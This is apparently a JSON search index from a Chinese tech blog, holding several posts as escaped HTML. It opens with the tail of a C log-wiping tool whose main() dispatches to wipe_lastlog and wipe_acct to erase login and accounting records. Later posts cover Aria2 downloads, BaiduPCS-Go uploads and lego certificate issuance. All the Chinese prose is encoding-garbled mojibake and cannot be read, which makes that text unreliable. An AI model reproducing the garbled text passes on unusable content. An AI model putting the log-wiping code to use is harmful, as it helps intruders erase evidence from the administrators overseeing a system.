class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\t\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\t\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\t\t\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\u003cspan class=\"cm\"\u003e/* ACCT */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003eusage\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003ewipe_acct\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linuxä¸‹çš„æ“¦é™¤å·¥å…·"},{"content":"å—ç“œè§†é¢‘æœ€è¿‘è¢«æ•´æ”¹ï¼Œä¸€æ—¶é™·å…¥ç‰‡è’ã€‚\nå®¶é‡Œçš„ç”µè§†æœºå¥½ä¸å®¹æ˜“ç¦æ­¢å‡çº§ï¼Œèƒ½ç”¨ESæµè§ˆå™¨ï¼ŒæŒ‚ä¸Šç™¾åº¦ç½‘ç›˜ï¼Œçœ‹å­˜åœ¨é‡Œé¢çš„ç”µå½±ã€‚\nä½†æ˜¯ï¼Œç™¾åº¦ç½‘ç›˜ç°åœ¨åŸºæœ¬æ˜¯ç£åŠ›å’ŒBTéƒ½å¤±æ•ˆäº†ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æƒ³ä¸ªåŠæ³•çœ‹æ€ä¹ˆä¸‹è½½å¹¶ä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜äº†ã€‚\nä¸€ã€Aria2ï¼Œç”¨æ¥ä¸‹è½½BTå’Œç£åŠ›æ–‡ä»¶ã€‚ å®‰è£…Aria2ï¼Œè¿™ä¸ªéå¸¸ç®€å•ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶å’Œä¸€å †é…ç½®æ–‡ä»¶å°±è¡Œäº†ã€‚\nwget https://github.com/P3TERX/Aria2-Pro-Core/releases/download/1.35.0_2021.02.19/aria2-1.35.0-static-linux-amd64.tar.gz tar zxvf aria2-1.35.0-static-linux-amd64.tar.gz mkdir /root/.aria2 cd /root/.aria2 wget https://p3terx.github.io/aria2.conf/aria2.conf wget https://p3terx.github.io/aria2.conf/clean.sh wget https://p3terx.github.io/aria2.conf/core wget https://p3terx.github.io/aria2.conf/script.conf wget https://p3terx.github.io/aria2.conf/rclone.env wget https://p3terx.github.io/aria2.conf/upload.sh wget https://p3terx.github.io/aria2.conf/delete.sh wget https://p3terx.github.io/aria2.conf/dht.dat wget https://p3terx.github.io/aria2.conf/dht6.dat wget https://p3terx.github.io/aria2.conf/move.sh wget https://p3terx.github.io/aria2.conf/LICENSE touch aria2.session æ³¨æ„è¿™é‡Œæ˜¯rootç”¨æˆ·è¿è¡Œï¼Œå¦‚æœè¦ç”¨å…¶ä»–ç”¨æˆ·ï¼Œä¿®æ”¹/root/.aria2/aria2.confé‡Œé¢çš„/rootå°±è¡Œã€‚\nç„¶åå†é€ ä¸ªsystemctlçš„å¯åŠ¨æ§åˆ¶æ–‡ä»¶ï¼š\ncat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/systemd/system/aria2.service [Unit] Description=aria2 Service After=network.target Wants=network.target [Service] Type=simple ExecStart=/root/aria2c --conf-path=/root/.aria2/aria2.conf Restart=on-failure # Don\u0026#39;t restart in the case of configuration error RestartPreventExitStatus=23 [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl start aria2 æ³¨æ„ï¼Œå¦‚æœæœ‰é˜²ç«å¢™ï¼Œæ³¨æ„æ‰“å¼€ä»¥ä¸‹ä¸‰ä¸ªç«¯å£ã€‚\ntcp 6800 tcp 51413 udp 51413 ç„¶åå°±å¥½äº†ï¼Œç„¶è€Œä½†æ˜¯ï¼Œæ²¡æœ‰ä»»ä½•å¯ç”¨ç•Œé¢\næˆ‘ä»¬å¼„ä¸ªç•Œé¢å§ï¼ŒAriaNGï¼Œå…¶å®å°±éœ€è¦ä¸€ä¸ªæ–‡ä»¶ï¼Œindex.html\nwget https://github.com/mayswind/AriaNg/releases/download/1.2.1/AriaNg-1.2.1-AllInOne.zip éšä¾¿æ”¾åˆ°ä¸ªwebæœåŠ¡å™¨ä¸Šï¼Œç„¶åæ‰“å¼€é…ç½®ä¸€ä¸‹\nç„¶åå°±èƒ½éšä¾¿å»ä¸‹è½½ç£åŠ›é“¾å’ŒBTäº†ã€‚\nç„¶åå‘¢ï¼Œæ€ä¹ˆä¼ åˆ°ç™¾åº¦äº‘ç›˜å»å‘¢ï¼Ÿ\nç»§ç»­ï¼Œç”¨BaiduPCS-Go\nwget https://github.com/qjfoidnh/BaiduPCS-Go/releases/download/v3.7.9/BaiduPCS-Go-v3.7.9-linux-amd64.zip ç„¶åç”¨æµè§ˆå™¨æ‰“å¼€pan.baidu.comï¼ŒF12è°ƒè¯•ï¼Œæ‹¿åˆ°Cookieä¸­çš„BDUSSå€¼\nå…ˆç™»å½•\n./BaiduPCS-Go login -bduss=xxxx ç„¶åå°±å¯ä»¥ä¸Šä¼ äº†ï¼Œæ³¨æ„ï¼Œå¦‚æœä¸Šä¼ çš„ç›®å½•ååé¢å¸¦/ç»“å°¾ï¼Œé‚£ä¼šæŠŠç›®å½•ä¸‹çš„ä¸œè¥¿ä¼ ä¸Šå»ï¼Œå¦‚æœä¸å¸¦/ç»“å°¾ï¼Œå°±ä¸Šä¼ æ•´ä¸ªç›®å½•ï¼Œè·Ÿrsyncçš„ç”¨æ³•ä¸€æ ·ï¼ˆå¾ˆä¸é”™ï¼‰ï¼Œç„¶åå»ç™¾åº¦ç½‘ç›˜çš„ç›®å½•moviesä¸‹å°±å¯ä»¥çœ‹åˆ°æ–‡ä»¶äº†ã€‚\nåŸºæœ¬ä¸Šæ˜¯ç§’ä¼ ï¼Œå› ä¸ºä½ ä¸‹çš„ä¸œè¥¿99%çš„æœºç‡ç™¾åº¦å·²ç»æœ‰äº†ï¼š\n./BaiduPCS-Go u çˆ±ï¼Œæ­»äº¡å’Œæœºå™¨äºº.Love.Death.and.Robots.S02 movies ç„¶åæ‰“å¼€ç”µè§†æœºä¸Šçš„ç™¾åº¦ç½‘ç›˜ï¼Œå°±å¯ä»¥è‡ªç”±è§‚çœ‹äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-aria2_baidu/","summary":"\u003cp\u003eå—ç“œè§†é¢‘æœ€è¿‘è¢«æ•´æ”¹ï¼Œä¸€æ—¶é™·å…¥ç‰‡è’ã€‚\u003c/p\u003e\n\u003cp\u003eå®¶é‡Œçš„ç”µè§†æœºå¥½ä¸å®¹æ˜“ç¦æ­¢å‡çº§ï¼Œèƒ½ç”¨ESæµè§ˆå™¨ï¼ŒæŒ‚ä¸Šç™¾åº¦ç½‘ç›˜ï¼Œçœ‹å­˜åœ¨é‡Œé¢çš„ç”µå½±ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œç™¾åº¦ç½‘ç›˜ç°åœ¨åŸºæœ¬æ˜¯ç£åŠ›å’ŒBTéƒ½å¤±æ•ˆäº†ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æƒ³ä¸ªåŠæ³•çœ‹æ€ä¹ˆä¸‹è½½å¹¶ä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜äº†ã€‚\u003c/p\u003e\n\u003ch4 id=\"ä¸€aria2ç”¨æ¥ä¸‹è½½btå’Œç£åŠ›æ–‡ä»¶\"\u003eä¸€ã€Aria2ï¼Œç”¨æ¥ä¸‹è½½BTå’Œç£åŠ›æ–‡ä»¶ã€‚\u003c/h4\u003e\n\u003cp\u003eå®‰è£…Aria2ï¼Œè¿™ä¸ªéå¸¸ç®€å•ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶å’Œä¸€å †é…ç½®æ–‡ä»¶å°±è¡Œäº†ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/P3TERX/Aria2-Pro-Core/releases/download/1.35.0_2021.02.19/aria2-1.35.0-static-linux-amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf aria2-1.35.0-static-linux-amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /root/.aria2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /root/.aria2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/aria2.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/clean.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/core\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/script.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/rclone.env\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/upload.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/delete.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/dht.dat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/dht6.dat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/move.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://p3terx.github.io/aria2.conf/LICENSE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etouch aria2.session\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„è¿™é‡Œæ˜¯rootç”¨æˆ·è¿è¡Œï¼Œå¦‚æœè¦ç”¨å…¶ä»–ç”¨æˆ·ï¼Œä¿®æ”¹/root/.aria2/aria2.confé‡Œé¢çš„/rootå°±è¡Œã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åå†é€ ä¸ªsystemctlçš„å¯åŠ¨æ§åˆ¶æ–‡ä»¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/systemd/system/aria2.service \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=aria2 Service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWants=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/root/aria2c --conf-path=/root/.aria2/aria2.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRestart=on-failure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# Don\u0026#39;t restart in the case of configuration error\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRestartPreventExitStatus=23\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl start aria2 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œå¦‚æœæœ‰é˜²ç«å¢™ï¼Œæ³¨æ„æ‰“å¼€ä»¥ä¸‹ä¸‰ä¸ªç«¯å£ã€‚\u003c/p\u003e","title":"Aria2ä¸‹è½½ç½‘å‰§å¹¶æé€Ÿä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜"},{"content":"amceç”³è¯·è¯ä¹¦å®åœ¨æ˜¯å¤ªçƒ¦äº†ï¼Œå¯¹äºä¸€å°åªæœ‰1cpu 512mçš„vpsæ¥è¯´ï¼Œè£…è¿™ä¸ªä¸œè¥¿ç®€ç›´å°±æ˜¯è´¹æ—¶è´¹åŠ²ã€‚\nå¥½åœ¨æœ‰äººå¹²è„†å¼€å‘äº†ä¸€ä¸ªgoè¯­è¨€çš„å·¥å…·legoï¼Œè¿™ä¸œè¥¿å®Œå…¨èƒ½å¤Ÿæ›¿ä»£æ‰ACME\nhttps://github.com/go-acme/lego/ åªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œæç®€ä¸»ä¹‰ï¼š\nç”³è¯·è¯ä¹¦ä¸€å¥è¯ï¼š\nlego --email=\u0026#34;foo@bar.com\u0026#34; --domains=\u0026#34;example.com\u0026#34; --http run å›ç­”ä¸€ä¸‹Yes\nç„¶åç”Ÿæˆçš„è¯ä¹¦éƒ½æ”¾åœ¨.lego/certificates/ç›®å½•ä¸‹\nç»­è´¹ä¹Ÿæ˜¯ä¸€å¥è¯\nlego --email=\u0026#34;foo@bar.com\u0026#34; --domains=\u0026#34;example.com\u0026#34; --http renew åŠå…¶ç®€å•ï¼Œä¹Ÿæ–¹ä¾¿æ¬è¿ã€‚ç”Ÿæˆçš„è¯ä¹¦crtæ˜¯å¸¦è¯ä¹¦é“¾æ¡çš„\nç”³è¯·å¥½å°±å¯ä»¥è£…trojanäº†ã€‚å®åœ¨æ˜¯æ–¹ä¾¿\nå¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘ä¸Šï¼Œå¯ä»¥å¼€ä¸€ä¸ªé˜¿é‡Œramè´¦å·ï¼Œç„¶åç”¨dnsçš„apiéªŒè¯\nALICLOUD_ACCESS_KEY=aaaaaaaa ALICLOUD_SECRET_KEY=bbbbbbbb \\ ./lego --email admin@ddky.com --dns alidns --domains *.ddky.com run å¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨namesiloä¸Šï¼ŒåŒæ ·å¯ä»¥å¼€ä¸€ä¸ªapiçš„keyï¼Œæ—¶é—´ä¸€å®šè¦æ”¾é•¿ï¼Œå¦åˆ™ä¸ç”Ÿæ•ˆï¼\nNAMESILO_API_KEY=ccccc NAMESILO_PROPAGATION_TIMEOUT=3600 NAMESILO_POLLING_INTERVAL=120 NAMESILO_TTL=3600 \\ ./lego --email zhangranrui@gmail.com --dns namesilo --domains *.rendoumi.com run ","permalink":"https://rendoumi.com/posts/20240124-lego_acme/","summary":"\u003cp\u003eamceç”³è¯·è¯ä¹¦å®åœ¨æ˜¯å¤ªçƒ¦äº†ï¼Œå¯¹äºä¸€å°åªæœ‰1cpu 512mçš„vpsæ¥è¯´ï¼Œè£…è¿™ä¸ªä¸œè¥¿ç®€ç›´å°±æ˜¯è´¹æ—¶è´¹åŠ²ã€‚\u003c/p\u003e\n\u003cp\u003eå¥½åœ¨æœ‰äººå¹²è„†å¼€å‘äº†ä¸€ä¸ªgoè¯­è¨€çš„å·¥å…·legoï¼Œè¿™ä¸œè¥¿å®Œå…¨èƒ½å¤Ÿæ›¿ä»£æ‰ACME\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://github.com/go-acme/lego/ \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œæç®€ä¸»ä¹‰ï¼š\u003c/p\u003e\n\u003cp\u003eç”³è¯·è¯ä¹¦ä¸€å¥è¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lego --email\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;foo@bar.com\u0026#34;\u003c/span\u003e --domains\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;example.com\u0026#34;\u003c/span\u003e --http 